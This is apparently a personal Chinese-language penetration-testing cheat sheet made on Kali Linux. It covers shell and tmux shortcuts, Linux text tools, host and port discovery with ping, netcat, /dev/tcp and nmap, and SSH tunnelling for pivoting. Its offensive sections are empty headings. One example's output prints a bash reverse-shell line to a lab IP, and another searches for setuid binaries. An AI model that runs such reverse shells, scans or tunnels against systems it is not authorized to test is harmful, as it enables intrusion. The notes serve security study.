！！！终端shell ！！！																					-->

快捷键
	CTRL+a			移动到最前
	CTRL+e			移动到最后
	CTRL+左右		以单词为单位快速移动
	CTRL+w			删除前一个单词
	ALT+d			删除后一个单词
	CTRL+d			删除当前字符
	CTRL+u			删除光标前所有内容
	CTRL+k			删除光标后所有内容

tmux	（终端复用）
	tmux		运行tmux
	CTRL+b			执行后可识别tmux命令！！！
	shift+"			添加下窗口
	shift+%			添加右窗口
	键盘上下左右		调整输入窗口
	CTRL+上下左右		调整窗口位置
	z				放大缩小窗口
	[				进入翻页模式（PGUP / PGDN）
	q / ESC			退出翻页模式










！！！基础 ！！！																						-->

id
		uid=0(root) gid=0(root) 组=0(root)



whoami
		root



uname

	uname -a
		Linux kali 6.5.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.5.6-1kali1 (2023-10-09) x86_64 GNU/Linux



ip
	ip a
		1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    		link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    		inet 127.0.0.1/8 scope host lo
		...

	ip link show										（显示网络接口信息）=ip a
	ip route show									（显示路由表）=ip r
	ip addr show										（显示地址信息）=ip a
	ip link set dev interface_name up/down				（启用/禁用接口）
	ip addr add/del ip_address/mask dev interface_name	（添加/删除 IP 地址）
	ip route add network/prefix via gateway				（配置静态路由）
	ip route del network/prefix							（删除静态路由）
	ip neigh show									（显示邻居信息（ARP 或 NDP））




ifconfig
		eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
		inet 192.168.184.150  netmask 255.255.255.0  broadcast 192.168.184.255
		inet6 fe80::20c:29ff:fe6c:ede7  prefixlen 64  scopeid 0x20<link>
		...




pwd
		/root



vi / vim
	？？



whereis		（用于查找可执行文件、源代码和帮助文档等相关文件的路径。会在标准目录以及源代码和帮助文档目录中查找文件。它通常会返回更多的信息，包括二进制、源代码和帮助文档路径。）

	whereis ps
		/usr/bin/ps
		/bin/ps



where		（用于查找可执行程序，但它通常是一个 shell 内建命令（built-in command）。会查找所有匹配的可执行文件，并输出它们的路径。）

	where ps
		/usr/bin/ps
		/bin/ps



which		（用于查找并显示与给定命令相关联的路径。它只查找在系统的 PATH 变量中能够找到的可执行文件。如果有多个符合条件的可执行文件，which 只返回第一个匹配的路径。）

	which ps
		/usr/bin/ps									（第一优先级）



export		（设置环境变量）

	export PATH=.:$PATH



env / printenv

	env | grep bin 
		SHELL=/usr/bin/zsh
		PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/root/.dotnet/tools
		_=/usr/bin/env



echo

	echo $PATH
		/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/root/.dotnet/tools



ls
		Desktop  Documents  Downloads  git  Music  Pictures  Public  reports  Templates  Videos  web

	-al
		总计 252
		drwx------ 29 root root  4096  2月22日 11:08 .
		drwxr-xr-x 19 root root  4096  1月17日 16:29 ..
		drwxr-xr-x  2 root root  4096 12月30日 10:29 .aws
		-rw-r--r--  1 root root   220 10月16日 10:13 .bash_logout



cd



find		（find [-H] [-L] [-P] [-Olevel] [-D debugopts] [path...] [expression]）

	find . -name she* 
		./shell.sh

	find / -perm -4000 -type f 2>/dev/null				（查找具有 setuid 权限的可执行文件）
		/usr/sbin/mount.nfs
		/usr/sbin/mount.cifs



grep	（grep [选项]... 模式 [文件]...）					（-E 可以使用正则表达式）

	cat /etc/passwd | grep root
		root:x:0:0:root:/root:/usr/bin/zsh
		nm-openvpn:x:130:138:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin

	cat /etc/passwd | grep -n ^a
		38:avahi:x:117:123:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
		64:arpwatch:x:140:150:ARP Watcher,,,:/var/lib/arpwatch:/bin/sh



xargs	（将前面结果作为后面命令的参数）

	ls | grep shell | xargs cat
		sh -i >&/dev/tcp/10.10.16.21/1234 0>&1



sed
	s（查找替换）
				sed 's| |%20|' file											(s为替换模式，将file里的空格替换成%20)
				sed 's|^|http://127.0.0.1|' file   	(在file每一行前面加上http://127.0.0.1并输出)
				sed '/xxx/s/dog/cat/' file					(将包含xxx的行中的dog替换成cat)									/要匹配包含的字符/
				sed '2,4s/dog/cat/'	file						(将2到4行的dog替换成cat)
				sed '1s|t|x|2' test											(将第一行的第二个t替换成x)
				sed '1s|t|x|g' test											(将第一行所有t替换成x)（g表示全局替换）

	a（在匹配行后面添加）反斜杠分割
				sed '2,4a\cat' file										(在2到4行后新开一行追加内容cat)

	i（在匹配行前面添加）反斜杠分割
				sed '3i\cat' file												(在第3行前新开一行追加内容cat)

	c（更改匹配的行）
				sed '2,4c\cat' file										(将2到4行替换成cat)

	y（对字符操作，转换，前后一一对应）
				sed 'y/abc/ABC/' file								(将a b c字符转换为对应的A B C)

	d（删除）
				sed '2,4d' file													(删除2到4行)
				sed '/123/d' file												(删除包含123的行)

	p（打印，-n抑制内存输出，避免重复）
				sed -n 'p' file													(打印文件)
				sed -n '/123/p' file									(打印含123的行)

	w（将修改的内容存入filename文件中）
				sed '3s/abc/123/w filename' file

	m（文本移动）
				sed '1,2m4' file												(将第1到2行移动到第4行之后)

	-e（多命令执行，用；链接，从左到右执行）				sed -e 's|http://127.0.0.1|https://1.1.1.1|;/2.2.2.2/d' file

	-r（正则表达式匹配，用于//匹配行）
				sed -r -n '/^http:\/\//p' file				(打印http://开头的行)
	



awk		（格式：awk ‘BEGIN {commands} pattern {commands}END{commands}' file1 ）
		（BEGIN:处理数据前执行的命令
		   END：处理数据后执行的命令
		   pattern：模式，每一行都执行的命令）
	cat /etc/passwd|awk -F ":" 'BEGIN{print "###start###"} $3>500&&$3<2000 {print $1,$3}END{print "###end###"}' 

	特殊变量：	FS			（指定分隔符，= -F ）
				NF			（当前处理的行的字段个数）
				NR			（当前处理的行号）
				$0			（当前处理行的内容）
				$n			（当前行的第 n 个字段）
				FILENAME	（被处理的文件名）
				RS			（数据记录分隔符，默认 \n ）
	-F 指定分隔符；OFS 指定输出分隔符
	awk -F ":" 'OFS="@@"{print $1,$2,$5}' /etc/passwd | head -5				（以 ：为分隔符，输出 passwd 文件前5行的 1 2 5 列）

	打印1-3行的行内容
	awk 'NR==1,NR==3{print $0}' a.txt		/		awk '(NR>=1)&&(NR<=3){print $0}' a.txt	

	/匹配/ 输出
	awk '/e$/{print $0}' a.txt

	输出变量
	awk -F ":" '{print NR,$NF }' passwd																（ 输出：1 /bin/bash ）

	通过 管道符 + 双引号 调用shell命令
	awk -F ":" '/bash$/{print|"wc -l"}' passwd

	做运算
	free -m | awk '/Mem:/{print int($3/($3+$4)*100)"%"}'
	
	

	



kill
	kill -9 %1											(%1 为上一条执行的命令)












！！！信息收集  ！！！																					-->

ping
	for i in {1..254}; do ping -c 1 -W 1 192.168.184.$i; done | grep from			(主机发现)（-c count次数，-W 超时时间）



nc.traditional（旧版netcat）
	nc.traditional -vv -z 192.168.184.1 1-65535 2>&1 | grep -v refused			(端口扫描，-vv 详细显示，-z 0数据传输，grep -v 为不显示匹配的行)



伪设备实现端口扫描														(！！！在bash环境下运行！！！)（kali一般终端为zsh，bash 命令进入 bash 环境）
	for i in {1..65535};do (echo < /dev/tcp/192.168.184.163/$i) &>/dev/null && printf "\n[+]The Open Port is: %d\n" "$i"  || printf ".";done		（&& 前面正确执行后面才执行）



nmap（具体步骤->）
	nmap -sn 192.168.184.0/24							（用ping发现主机）

	nmap --min-rate 10000 -p- 192.168.184.1				（10000速度比较准确，且至少扫描两次）
		Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-25 16:27 CST
		Nmap scan report for 192.168.184.1
		Host is up (0.00022s latency).
		Not shown: 65525 filtered tcp ports (no-response)
		PORT      STATE SERVICE
		22/tcp    open  ssh
		...

	nmap -sU --min-rate 10000 -p- 192.168.184.1			（用UDP扫描，防止遗漏）

	nmap -sT -sV -O -p80,... 192.168.184.1				（将上面扫描的端口作为参数，继续扫描 TCP 服务版本信息 操作系统信息 指定端口）（最重要的一次扫描）

	nmap --script=vuln -p80,... 192.168.184.1				（--script=vuln 使用漏洞扫描脚本，）
													（-6 可以扫描IPV6）



whatweb
	whatweb baidu.com
		










！！！密码爆破！！！																						-->










！！！漏洞测试！！！																						-->










！！！漏洞利用！！！																						-->










！！！权限提升！！！																						-->










！！！权限维持！！！																						-->










！！！内网渗透！！！																						-->

ssh / autossh（-p 指定端口，-C 允许压缩数据，-N 不执行远程指令，-L 使用本地端口转发，-R 使用转成端口转发，-f 后台执行，-D 指定动态端口转发 1080是标准的SOCKS 端口）（格式：ssh -NL/R ip1:port:ip2:port user@ip3）
													用于本机				用于远程主机
	正向转发（A	 B	C）
			150   60   70
	ssh -NL 0.0.0.0:6000:192.168.184.70:80 root@192.168.184.60				（以 60 为中介，将 150 / 60 下的 6000 端口转发志 70 的 80 端口）		-L	->	0.0.0.0
																	（在 B 上执行，本地端口映射到其他机器）
																	（在 A 上执行，本地端口通过跳板映射到其他机器）
	ssh -NL 0.0.0.0:6000:192.168.184.70:80 192.168.184.60	（0.0.0.0 表示所有网卡）


	反向端口转发（A	 B	|C|	 D	E）
				150	200	NAT	 13   15
				  公网		  内网
	ssh -NR 0.0.0.0:18000:10.10.10.13:3389 192.168.184.200					（ B 获取了 E 的控制权，通过 E 为中介将 200 的 18000 端口映射到 内网13 的 3389 端口）（kali_A 远程连接 rdesktop 192.168.184.200:18000）
	ssh -NR 10022:127.0.0.1:22 192.168.184.200							（ B 执行 ssh 127.0.0.1 -p 10022）


































